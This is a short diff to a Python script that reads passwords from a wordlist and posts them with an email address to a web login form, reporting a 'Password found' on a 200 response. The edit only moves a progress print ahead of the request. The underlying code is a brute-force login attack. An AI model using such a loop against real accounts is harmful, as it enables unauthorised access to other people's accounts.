@@ -23,9 +23,9 @@ for password in file.readlines():
 
     # collect the data needed from "inspect element"
     data = {'email':email, 'password':password}
+    print("[*] Attempting password: %s" % password)
     send_data_url = requests.post(url, data=data)
 
-    print("[*] Attempting password: %s" % password)
     if send_data_url.status_code == 200:
         print("[*] Password found: %s " % password)
         print(send_data_url.content)
